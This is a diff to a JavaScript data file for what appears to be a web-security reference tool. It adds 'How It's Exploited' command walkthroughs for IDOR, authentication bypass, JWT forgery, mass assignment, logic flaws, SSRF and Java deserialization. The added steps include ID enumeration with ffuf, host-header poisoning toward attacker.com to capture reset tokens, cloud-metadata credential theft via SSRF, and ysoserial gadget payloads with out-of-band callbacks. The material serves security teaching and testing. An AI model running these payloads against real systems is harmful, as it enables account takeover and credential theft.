@@ -975,7 +975,7 @@ var VULNS = [
       }
     ]
   },
-  {
+    {
     category: "Access Control & Authentication",
     vulns: [
       {
@@ -984,7 +984,7 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/access-control",
         description: "The app trusts a client-supplied identifier without checking ownership, exposing other users' data or actions.",
-        brief: "Broken access control is the most common serious web weakness, and IDOR (Insecure Direct Object Reference) is its signature form: an endpoint accepts an object identifier — a user ID, order number, document GUID — and returns or modifies that object without verifying the requester is authorised for it. Change the ID, get someone else's data.\n\nIt covers horizontal access (reaching a peer's resources), vertical access (reaching admin functionality), and missing function-level checks. The root cause is authorising on what the client sends rather than on the authenticated identity.",
+        brief: "Broken access control is the most common serious web weakness, and IDOR (Insecure Direct Object Reference) is its signature form: an endpoint accepts an object identifier — a user ID, order number, document GUID — and returns or modifies that object without verifying the requester is authorised for it. Change the ID, get someone else's data.\n\nImpact: mass exposure of other users' records, cross-account takeover, and privilege escalation into admin functionality. The root cause is authorising on what the client sends rather than on the authenticated identity.",
         quickReference: [
           { label: "Horizontal IDOR", cmd: "GET /api/account/1001  ->  change to 1002" },
           { label: "Method / function abuse", cmd: "POST /api/user/1002/role  as a normal user" },
@@ -992,6 +992,17 @@ var VULNS = [
           { label: "Force-browse admin paths", cmd: "/admin, /api/internal, hidden endpoints from JS/archives" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Capture an authenticated object request", cmd: "# log in as your own user and note requests carrying an identifier:\nGET /api/account/1001            # your own account id\nGET /api/orders/50231/invoice    # a doc/order reference\n# any client-supplied id is a candidate" },
+              { label: "2. Change the identifier to another user's", cmd: "GET /api/account/1002            # a neighbouring id -> someone else's data?\n# also try encoded refs: base64, hashids, GUIDs harvested from other responses\n# 200 with another user's data = horizontal IDOR" },
+              { label: "3. Automate with two accounts (Autorize)", cmd: "# Burp -> Autorize: log the low-priv session cookie, browse as the high-priv user\n# Autorize replays each request with the low-priv session and flags any that succeed\n# this catches missing per-object and per-function checks at scale" },
+              { label: "4. Abuse the method / function level", cmd: "# the UI hides an action but the endpoint may not enforce the role:\nPUT /api/user/1002/role   {\"role\":\"admin\"}   # vertical escalation\nDELETE /api/orders/50231                       # verb the UI never exposes" },
+              { label: "5. Enumerate at scale", cmd: "# sequential ids -> Burp Intruder / ffuf over the id range\nffuf -w ids.txt -u 'https://target/api/account/FUZZ' -H 'Cookie: session=..' -mc 200\n# harvest every record; force-browse /admin, /api/internal from JS/wayback" }
+            ]
+          },
           {
             title: "Forms of Broken Access Control",
             type: "table",
@@ -1005,26 +1016,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Technique", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Two accounts", "Do an action as user A, replay it as user B (or with B's session) — Burp Autorize automates this"],
-              ["Change the identifier", "Increment/replace IDs, GUIDs, and encoded references"],
-              ["Change the method", "Try PUT/DELETE where only GET is exposed"],
-              ["Remove/alter role hints", "Strip a role parameter or set it to a higher value"],
-              ["Force browsing", "Request admin/internal endpoints discovered in JS or archives directly"]
+              ["1", "Find an endpoint taking a client id", "Candidate IDOR"],
+              ["2", "Swap in another user's identifier", "Access to their resource"],
+              ["3", "Automate enumeration over the id space", "Mass data exposure"],
+              ["4", "Abuse method/function-level gaps", "Privilege escalation / takeover"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Mass data exposure", "Enumerate every user's records via a sequential ID"],
-              ["Account takeover", "Change another user's email/password"],
-              ["Privilege escalation", "Reach admin functions as a normal user"],
-              ["Unauthorised actions", "Modify or delete resources you do not own"]
+              ["Burp Suite (Autorize)", "Automatic per-request access-control testing with two sessions"],
+              ["ffuf / Burp Intruder", "Enumerate sequential or fuzzable identifiers"],
+              ["gau / waybackurls", "Discover hidden endpoints to force-browse"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Access control vulnerabilities", url: "https://portswigger.net/web-security/access-control" },
+              { label: "OWASP — Authorization Testing / IDOR Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" }
             ]
           },
           {
@@ -1046,7 +1063,7 @@ var VULNS = [
         severity: "Critical",
         ref: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
         description: "Flaws in login, session, or recovery logic that let an attacker authenticate without valid credentials.",
-        brief: "Authentication is meant to prove who you are; a bypass defeats that proof. The weaknesses are diverse — logic flaws in the login flow, broken multi-factor steps, predictable or improperly invalidated session tokens, and flawed password-reset mechanisms — but they share an outcome: access to an account without the legitimate credential.\n\nThis entry covers the flow-level failures; injection-based bypasses (SQL/NoSQL/LDAP) and token forgery (JWT) have their own entries.",
+        brief: "Authentication is meant to prove who you are; a bypass defeats that proof. The weaknesses are diverse — logic flaws in the login flow, broken multi-factor steps, predictable or improperly invalidated session tokens, and flawed password-reset mechanisms — but they share an outcome: access to an account without the legitimate credential.\n\nImpact: account takeover, MFA defeat, and — for a systemic reset/session flaw — mass compromise. This entry covers the flow-level failures; injection-based bypasses (SQL/NoSQL/LDAP) and token forgery (JWT) have their own entries.",
         quickReference: [
           { label: "MFA step skippable", cmd: "Complete step 1, then request the post-MFA endpoint directly" },
           { label: "Response tampering", cmd: "Change {\"success\":false} / 2FA result at the client where the server trusts it" },
@@ -1054,6 +1071,17 @@ var VULNS = [
           { label: "Session issues", cmd: "Session not rotated on login, weak/guessable IDs, no expiry, fixation" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Map every step and reach later ones directly", cmd: "# walk the full flow: login -> mfa -> dashboard\n# then request the post-auth endpoint straight after step 1:\nGET /account/dashboard   (with the half-authenticated cookie)\n# if it loads, the 2FA step is not enforced server-side" },
+              { label: "2. Tamper client-trusted signals", cmd: "# intercept the MFA/login response and flip the decision:\n{\"mfa\":\"fail\"}  ->  {\"mfa\":\"pass\"}\n{\"success\":false} -> true\n# or set a role/verified flag the server later reads without re-checking" },
+              { label: "3. Attack password reset", cmd: "# inspect the reset token: entropy, whether it is bound to the user, reuse\n# host-header poisoning to steal the reset link:\nPOST /reset  Host: attacker.com   email=victim@corp\n# victim's link now points to attacker.com -> token captured" },
+              { label: "4. Analyse session tokens", cmd: "# is the session id rotated on login? predictable? invalidated on logout?\n# session fixation: set a known id pre-login, see if it survives authentication\n# no rotation on privilege change -> fixation / hijack" },
+              { label: "5. Try default and leftover accounts", cmd: "# admin panels and appliances often keep defaults:\nadmin:admin   admin:password   <product-default>\n# and old test accounts that were never removed" }
+            ]
+          },
           {
             title: "Common Bypass Classes",
             type: "table",
@@ -1067,26 +1095,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Test", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Map the full flow", "Every step and every endpoint; try reaching later steps directly"],
-              ["Tamper client signals", "Flip success flags, MFA-passed booleans, role values the server may trust"],
-              ["Attack password reset", "Inspect token entropy, binding, reuse, and the link-generation source"],
-              ["Analyse tokens", "Session/reset token randomness, expiry, rotation, and invalidation behaviour"],
-              ["Try known/default creds", "admin/admin and product defaults on admin panels"]
+              ["1", "Map the full auth/reset flow", "Understand each enforced step"],
+              ["2", "Skip a step or tamper a signal", "Server accepts an unproven state"],
+              ["3", "Or capture/forge a reset token", "Control of the reset link"],
+              ["4", "Authenticate as the victim", "Account takeover / MFA defeat"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Account takeover", "Full access to a victim's account and data"],
-              ["MFA defeat", "Access despite a second factor being 'required'"],
-              ["Mass compromise", "A systemic reset/session flaw affects all users"],
-              ["Privileged access", "Bypass into an admin account"]
+              ["Burp Suite", "Flow mapping, response tampering, reset-token analysis"],
+              ["hydra / ffuf", "Test default credentials and login rate-limiting"],
+              ["custom scripts", "Measure reset/session token entropy"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Identification and Authentication Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
+              { label: "PortSwigger — Authentication vulnerabilities", url: "https://portswigger.net/web-security/authentication" }
             ]
           },
           {
@@ -1108,7 +1142,7 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/jwt",
         description: "Implementation flaws in JSON Web Tokens — alg confusion, none, weak secrets — enabling token forgery.",
-        brief: "JWTs carry identity and claims in a signed token the server verifies without server-side session state. That design shifts trust onto the signature, and a set of well-known implementation mistakes break it: accepting the 'none' algorithm, confusing RS256 with HS256 so the public key becomes the HMAC secret, weak signing secrets that crack offline, and unvalidated claims.\n\nWhen verification is broken, an attacker forges a token with any identity or role they like — instant privilege escalation or account takeover.",
+        brief: "JWTs carry identity and claims in a signed token the server verifies without server-side session state. That design shifts trust onto the signature, and a set of well-known implementation mistakes break it: accepting the 'none' algorithm, confusing RS256 with HS256 so the public key becomes the HMAC secret, weak signing secrets that crack offline, and unvalidated claims.\n\nImpact: when verification is broken, an attacker forges a token with any identity or role they like — instant privilege escalation or account takeover.",
         quickReference: [
           { label: "alg: none", cmd: "Set header alg to \"none\", strip the signature — some libs accept it" },
           { label: "Key confusion RS256->HS256", cmd: "Sign HS256 using the RSA public key as the HMAC secret" },
@@ -1116,6 +1150,17 @@ var VULNS = [
           { label: "Tamper claims", cmd: "Change \"role\":\"user\" -> \"admin\" (only works if the sig check is broken)" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Decode and read the header", cmd: "# the alg field decides which attacks apply\njwt_tool <token>                 # decode header + claims\n# note alg (HS256/RS256/none), kid/jku/x5u, and the claims you'd want to forge" },
+              { label: "2. Run the automated playbook", cmd: "jwt_tool <token> -M at -t https://target/api/me -rc 'session=<jwt>'\n# -M at exercises: alg:none, RS256->HS256 confusion, blank/known keys, claim tampering\n# any request that stays authorised marks a working forgery" },
+              { label: "3. alg:none forgery", cmd: "# set header alg to none and strip the signature:\njwt_tool <token> -X a -pc role -pv admin\n# a library that honours 'none' accepts the unsigned, attacker-set claims" },
+              { label: "4. RS256 -> HS256 key confusion", cmd: "# grab the server's RSA public key (jwks / cert), then HMAC-sign with it:\njwt_tool <token> -X k -pk public.pem -pc role -pv admin\n# the verifier uses the public key as the HMAC secret -> your token validates" },
+              { label: "5. Crack a weak HMAC secret and forge", cmd: "hashcat -a 0 -m 16500 token.jwt wordlist.txt      # recover the secret\njwt_tool <token> -S hs256 -p '<cracked-secret>' -pc role -pv admin\n# now sign arbitrary claims (any user, any role)" }
+            ]
+          },
           {
             title: "Attack Classes",
             type: "table",
@@ -1129,26 +1174,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Decode and read alg", "The header's alg determines which attacks even apply"],
-              ["Run the playbook", "jwt_tool -M at against a live endpoint tries none, confusion, and more"],
-              ["Test secret strength", "Attempt an offline crack of the HMAC secret"],
-              ["Probe key headers", "Manipulate kid/jku/x5u to control the verification key"],
-              ["Check claim validation", "Alter exp/aud/iss and see if the token is still accepted"]
+              ["1", "Decode the token, read alg + claims", "Applicable attack surface"],
+              ["2", "Break verification (none/confusion/secret)", "Ability to sign arbitrary tokens"],
+              ["3", "Forge claims (sub/role)", "Any identity or admin role"],
+              ["4", "Replay to the API", "Privilege escalation / takeover"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Privilege escalation", "Forge a token with an admin role"],
-              ["Account takeover", "Forge a token for any user (sub/username)"],
-              ["Auth bypass", "Unsigned/forged token accepted as valid"],
-              ["Cross-service abuse", "Reuse a token where aud/iss are not enforced"]
+              ["jwt_tool", "Automated JWT attack playbook and forgery"],
+              ["hashcat (-m 16500)", "Crack weak HMAC signing secrets"],
+              ["Burp (JWT Editor)", "Manual header/claim tampering and key-confusion signing"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — JWT attacks", url: "https://portswigger.net/web-security/jwt" },
+              { label: "OWASP — JSON Web Token Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" }
             ]
           },
           {
@@ -1170,7 +1221,7 @@ var VULNS = [
         severity: "High",
         ref: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
         description: "The app binds request fields straight to objects, letting attackers set properties they shouldn't control.",
-        brief: "Mass assignment (auto-binding, over-posting) happens when a framework maps incoming request parameters directly onto an internal object or model. If the binding is not restricted, an attacker adds fields the developer never intended to expose — isAdmin, role, balance, verified — and the framework dutifully sets them.\n\nIt is common in modern API frameworks that make object binding effortless, and it turns an ordinary update endpoint into a privilege-escalation primitive.",
+        brief: "Mass assignment (auto-binding, over-posting) happens when a framework maps incoming request parameters directly onto an internal object or model. If the binding is not restricted, an attacker adds fields the developer never intended to expose — isAdmin, role, balance, verified — and the framework dutifully sets them.\n\nImpact: privilege escalation, business-data tampering, and object-ownership takeover. It is common in modern API frameworks that make object binding effortless, and it turns an ordinary update endpoint into an escalation primitive.",
         quickReference: [
           { label: "Add a privileged field", cmd: "{\"username\":\"x\",\"email\":\"y\",\"isAdmin\":true}" },
           { label: "Escalate role on update", cmd: "PATCH /api/users/me  {\"role\":\"admin\"}" },
@@ -1179,25 +1230,55 @@ var VULNS = [
         ],
         sections: [
           {
-            title: "Finding It",
-            type: "table",
-            columns: ["Step", "Detail"],
-            rows: [
-              ["Enumerate object fields", "A GET on the resource reveals the property names to try setting"],
-              ["Add unexpected fields", "Append role/isAdmin/verified/owner to a create or update request"],
-              ["Watch for silent binding", "The field is accepted and persisted even though the UI never offered it"],
-              ["Try nested/related objects", "Bind through relationships (e.g. user.roles) where supported"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate the object's fields", cmd: "# a GET on the resource reveals every property name:\nGET /api/users/me\n# {\"id\":7,\"username\":\"x\",\"email\":\"y\",\"role\":\"user\",\"verified\":false, ...}\n# each server-owned field is a candidate to over-post" },
+              { label: "2. Over-post a privileged field on write", cmd: "# add fields the form never offered to a create/update:\nPATCH /api/users/me\n{\"email\":\"y\",\"role\":\"admin\"}          # escalate role\n{\"username\":\"x\",\"isAdmin\":true}       # privilege flag\n# accepted + persisted = mass assignment" },
+              { label: "3. Tamper business / ownership fields", cmd: "{\"balance\":100000}        # money\n{\"verified\":true}         # skip verification\n{\"userId\":<other-user>}   # reassign ownership of the object to a victim/you" },
+              { label: "4. Bind through nested relationships", cmd: "# some frameworks bind related objects too:\n{\"profile\":{\"user\":{\"roles\":[\"admin\"]}}}\n# reach privileged attributes via the object graph where direct fields are blocked" },
+              { label: "5. Confirm persistence", cmd: "# re-GET the object and verify the injected field stuck:\nGET /api/users/me   -> \"role\":\"admin\"\n# then use the new privilege" }
             ]
           },
           {
-            title: "Impact",
+            title: "Fields Worth Injecting",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Field", "Effect"],
             rows: [
-              ["Privilege escalation", "Set isAdmin/role and become an administrator"],
-              ["Business-data tampering", "Change price, balance, ownership, or status fields"],
-              ["Account takeover", "Reassign an object's owner/user to yourself"],
-              ["Verification bypass", "Flip verified/approved flags"]
+              ["role / isAdmin / groups", "Privilege escalation to administrator"],
+              ["verified / approved / active", "Bypass verification or approval gates"],
+              ["balance / price / credit", "Financial tampering"],
+              ["userId / ownerId", "Reassign object ownership"],
+              ["id", "Overwrite a different record"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "GET the object to learn its fields", "List of server-owned properties"],
+              ["2", "Over-post a privileged field on write", "Server binds it blindly"],
+              ["3", "Re-GET to confirm persistence", "Field is set"],
+              ["4", "Use the new state (role/ownership)", "Escalation / takeover"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Burp Suite", "Add fields to requests and confirm binding"],
+              ["Postman / curl", "Craft JSON bodies with extra properties"],
+              ["JS source review", "Discover model field names to target"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Mass Assignment Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" },
+              { label: "OWASP API Security — Broken Object Property Level Authorization", url: "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" }
             ]
           },
           {
@@ -1219,7 +1300,7 @@ var VULNS = [
         severity: "Medium",
         ref: "https://portswigger.net/web-security/logic-flaws",
         description: "The application enforces its rules incorrectly, letting valid requests achieve invalid outcomes.",
-        brief: "Business logic flaws are failures in how an application's rules and workflows are enforced, rather than a classic injection or encoding bug. Every request may be individually well-formed, yet the sequence or combination produces an outcome the business never intended — a negative quantity that credits money, a coupon applied infinitely, a step skipped, a limit not enforced server-side.\n\nThey are invisible to scanners because nothing is malformed; finding them requires understanding what the application is supposed to guarantee and then breaking that assumption.",
+        brief: "Business logic flaws are failures in how an application's rules and workflows are enforced, rather than a classic injection or encoding bug. Every request may be individually well-formed, yet the sequence or combination produces an outcome the business never intended — a negative quantity that credits money, a coupon applied infinitely, a step skipped, a limit not enforced server-side.\n\nImpact: financial loss, policy and entitlement bypass, and data-integrity damage. They are invisible to scanners because nothing is malformed; finding them requires understanding what the application is supposed to guarantee and then breaking that assumption.",
         quickReference: [
           { label: "Value manipulation", cmd: "quantity=-1   price=0   currency swap   over-long/negative inputs" },
           { label: "Step skipping", cmd: "Jump straight to the confirmation/fulfilment endpoint" },
@@ -1227,6 +1308,17 @@ var VULNS = [
           { label: "State confusion", cmd: "Cancel-after-fulfil, refund + keep, concurrent requests (see Race Conditions)" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Model what the workflow must guarantee", cmd: "# write down the invariant, then attack it:\n#   'total charged = sum(item price x qty)'  -> break with qty=-1\n#   'a coupon is single-use'                 -> replay it\n#   'you must pay before fulfilment'         -> skip the pay step" },
+              { label: "2. Tamper every value", cmd: "# negative / zero / huge / wrong-type / someone-else's:\nquantity=-1        # negative qty can credit money back\nprice=0            # client-sent price trusted?\ncurrency=IDR->USD  # unit/currency confusion on the total" },
+              { label: "3. Reorder and skip steps", cmd: "# call the fulfilment/confirmation endpoint directly, before payment:\nPOST /checkout/complete?order=123   # reached without the pay step?\n# replay steps out of sequence to land in a state the design forbids" },
+              { label: "4. Abuse limits and single-use items", cmd: "# reuse a one-time coupon / referral code:\nfor i in 1..100: POST /cart/apply-coupon  code=WELCOME10\n# exceed per-account caps, stack discounts, farm referral credit" },
+              { label: "5. Break assumptions with concurrency", cmd: "# fire simultaneous requests to defeat a 'once only' check:\n# 20x parallel  POST /redeem  giftcard=ABC   (see Race Conditions)\n# double-spend, over-withdraw, apply a balance twice" }
+            ]
+          },
           {
             title: "Common Patterns",
             type: "table",
@@ -1240,26 +1332,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Approach", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Model the intent", "Write down what each workflow is supposed to guarantee, then attack that guarantee"],
-              ["Tamper every value", "Negative, zero, huge, wrong-type, and someone-else's values"],
-              ["Reorder and skip", "Replay steps out of sequence; call endpoints directly"],
-              ["Test limits", "Push past quotas, reuse single-use items, and combine discounts"],
-              ["Concurrency", "Fire simultaneous requests to break assumptions (overlaps with race conditions)"]
+              ["1", "Model the workflow's intended guarantee", "A concrete invariant to break"],
+              ["2", "Tamper values / skip steps / reuse limits", "An invalid but accepted request"],
+              ["3", "Observe the unintended outcome", "Free goods / bypassed policy"],
+              ["4", "Repeat / automate at scale", "Material fraud or loss"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Financial loss", "Free goods, negative charges, infinite discounts, refund abuse"],
-              ["Policy bypass", "Circumvent limits, approvals, or entitlements"],
-              ["Data integrity", "Objects left in impossible or inconsistent states"],
-              ["Fraud", "Loyalty/referral/coupon abuse at scale"]
+              ["Burp Suite (Repeater/Turbo Intruder)", "Value tampering, step replay, high-rate concurrency"],
+              ["Manual analysis", "Model workflow intent and abuse cases"],
+              ["curl / scripts", "Reproduce out-of-order and parallel request sequences"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Business logic vulnerabilities", url: "https://portswigger.net/web-security/logic-flaws" },
+              { label: "OWASP — Testing for Business Logic", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/" }
             ]
           },
           {
@@ -1277,7 +1375,7 @@ var VULNS = [
       }
     ]
   },
-  {
+    {
     category: "Server-Side",
     vulns: [
       {
@@ -1286,7 +1384,7 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/ssrf",
         description: "The server is tricked into making requests to attacker-chosen URLs, reaching internal services and cloud metadata.",
-        brief: "SSRF occurs when an application fetches a URL supplied or influenced by the user and does not restrict where that request can go. The attacker points it at internal-only services, the loopback interface, or the cloud metadata endpoint — and the server, trusted inside the network, makes the request on their behalf.\n\nIt is especially dangerous in cloud environments, where the metadata service (169.254.169.254) hands out temporary credentials to anything that can reach it. SSRF is a frequent first step toward internal compromise.",
+        brief: "SSRF occurs when an application fetches a URL supplied or influenced by the user and does not restrict where that request can go. The attacker points it at internal-only services, the loopback interface, or the cloud metadata endpoint — and the server, trusted inside the network, makes the request on their behalf.\n\nImpact: theft of cloud credentials from the metadata service, internal recon and access to admin panels, and a frequent first step toward internal compromise. It is especially dangerous in cloud environments, where 169.254.169.254 hands temporary credentials to anything that can reach it.",
         quickReference: [
           { label: "Cloud metadata (AWS)", cmd: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
           { label: "Internal / loopback", cmd: "http://127.0.0.1:8080/   http://localhost/admin   http://10.0.0.5/" },
@@ -1295,14 +1393,14 @@ var VULNS = [
         ],
         sections: [
           {
-            title: "Where It Hides",
-            type: "table",
-            columns: ["Feature", "Why"],
-            rows: [
-              ["URL fetchers", "Webhooks, URL preview, 'import from URL', PDF/screenshot generators"],
-              ["File/image processors", "Servers that fetch remote images or follow embedded references"],
-              ["Integrations", "Callbacks, OAuth discovery, XML/SVG (see XXE), and API proxies"],
-              ["Redirect following", "A fetch that follows redirects can be sent inward after passing a filter"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Find a feature that fetches a URL", cmd: "# webhooks, URL preview, 'import from URL', PDF/screenshot render, avatar-by-URL\nPOST /api/import  {\"url\":\"https://example.com/data.json\"}\n# swap in an internal/loopback target and watch the response/timing" },
+              { label: "2. Confirm blind SSRF with an OOB callback", cmd: "# point it at your Collaborator/interactsh host:\n{\"url\":\"http://abcd.oastify.com/\"}\n# a DNS/HTTP hit proves the server made the request even with no reflected body" },
+              { label: "3. Hit cloud metadata for credentials", cmd: "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\n# then read the role name and fetch its temporary keys:\n{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>\"}\n# AccessKeyId/SecretAccessKey/Token -> use the instance role" },
+              { label: "4. Reach internal-only services", cmd: "http://127.0.0.1:8080/       # local admin app\nhttp://10.0.0.5/actuator/env  # Spring Boot secrets\nhttp://169.254.169.254/       # GCP/Azure metadata variants\n# port-probe internal ranges via response/timing differences" },
+              { label: "5. Bypass weak filters", cmd: "http://127.1   http://0177.0.0.1   http://[::1]   http://2130706433/   # ip encodings\nhttp://internal.evil.com  (A record -> 127.0.0.1)                        # DNS pinning\n# allowed host + open redirect -> redirected inward; DNS rebinding for TOCTOU" }
             ]
           },
           {
@@ -1317,14 +1415,33 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Cloud credential theft", "Read IAM/metadata credentials, then act as the instance role"],
-              ["Internal recon & access", "Port-scan and reach internal-only services and admin panels"],
-              ["Data exfiltration", "Pull internal responses back through the vulnerable app"],
-              ["Escalation", "Chain to RCE via internal services (e.g. unauthenticated admin APIs)"]
+              ["1", "Find a URL-fetching feature", "Candidate SSRF sink"],
+              ["2", "Confirm with an OOB callback", "Server makes attacker-chosen requests"],
+              ["3", "Hit metadata / internal services", "Cloud creds or internal access"],
+              ["4", "Use creds / chain to internal RCE", "Wider network compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Burp Suite (+ Collaborator)", "Manual probing and blind-SSRF OOB detection"],
+              ["Interactsh", "Out-of-band callback server for blind confirmation"],
+              ["SSRFmap / Gopherus", "Automate exploitation and craft gopher:// payloads to internal services"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — SSRF", url: "https://portswigger.net/web-security/ssrf" },
+              { label: "OWASP — SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
+              { label: "PayloadsAllTheThings — SSRF", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" }
             ]
           },
           {
@@ -1346,7 +1463,7 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/deserialization",
         description: "Deserializing attacker-controlled data instantiates dangerous object graphs, often leading to RCE.",
-        brief: "Serialization turns objects into a byte/stream format; deserialization rebuilds them. When an application deserializes data an attacker controls, and the runtime's classpath contains suitable 'gadget' classes, a crafted object graph triggers a chain of method calls during reconstruction — frequently ending in command execution.\n\nIt affects Java, .NET, PHP, Python (pickle), Ruby, and Node, and it is critical because it is often reachable in cookies, hidden fields, view state, and message queues without any special privilege.",
+        brief: "Serialization turns objects into a byte/stream format; deserialization rebuilds them. When an application deserializes data an attacker controls, and the runtime's classpath contains suitable 'gadget' classes, a crafted object graph triggers a chain of method calls during reconstruction — frequently ending in command execution.\n\nImpact: remote code execution as the app process, plus auth/logic bypass by tampering serialized fields. It affects Java, .NET, PHP, Python (pickle), Ruby, and Node, and is critical because it is often reachable in cookies, hidden fields, and view state without any special privilege.",
         quickReference: [
           { label: "Java serialized blob (spot it)", cmd: "Base64 starting rO0AB...   raw bytes AC ED 00 05" },
           { label: "Generate a Java gadget", cmd: "java -jar ysoserial.jar CommonsCollections5 \"id\" | base64 -w0" },
@@ -1354,6 +1471,17 @@ var VULNS = [
           { label: ".NET ViewState / PHP", cmd: "ysoserial.net for __VIEWSTATE; PHP object injection via unserialize()" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Spot serialized data in traffic", cmd: "# Java:  base64 'rO0AB...'  or raw bytes  AC ED 00 05\n# .NET:  __VIEWSTATE=...   PHP:  O:4:\"User\":... / a:2:{...}\n# cookies, hidden fields, and API bodies are the usual carriers" },
+              { label: "2. Confirm safely with URLDNS (no RCE)", cmd: "java -jar ysoserial.jar URLDNS 'http://abcd.oastify.com' | base64 -w0\n# submit it where the blob is deserialized; a DNS lookup proves the sink\n# this triggers no code execution -> safe on production" },
+              { label: "3. Find a working gadget chain (Java)", cmd: "# probe likely libraries on the classpath:\nfor g in CommonsCollections5 CommonsCollections6 CommonsBeanutils1 Groovy1; do\n  java -jar ysoserial.jar $g 'nslookup $g.oastify.com' | base64 -w0; done\n# whichever fires the callback is the live chain" },
+              { label: "4. .NET ViewState / PHP variants", cmd: "# .NET (known machineKey or unprotected VIEWSTATE):\nysoserial.net -p ViewState -g TypeConfuseDelegate -c \"nslookup me.oastify.com\" ...\n# PHP object injection: craft a serialized object hitting a __wakeup/__destruct gadget" },
+              { label: "5. Weaponise with a benign proof", cmd: "# swap the command for an in-scope proof once a chain lands:\njava -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0\n# stop at 'id' / a callback unless full exploitation is authorised" }
+            ]
+          },
           {
             title: "Where the Data Enters",
             type: "table",
@@ -1367,25 +1495,33 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Spot serialized data", "rO0AB / AC ED (Java), ViewState, PHP O:/a: patterns in traffic"],
-              ["Confirm safely", "Send a URLDNS payload with an OOB callback — a lookup proves deserialization without RCE"],
-              ["Identify gadgets", "Probe likely libraries (CommonsCollections, etc.); errors reveal the stack"],
-              ["Weaponise", "Swap in a benign command once a chain lands"]
+              ["1", "Spot serialized data", "Candidate deserialization sink"],
+              ["2", "Confirm with URLDNS (OOB)", "Sink verified without RCE"],
+              ["3", "Find a live gadget chain", "Code execution primitive"],
+              ["4", "Run a benign command", "RCE as the app process"]
             ]
           },
           {
-            title: "Impact",
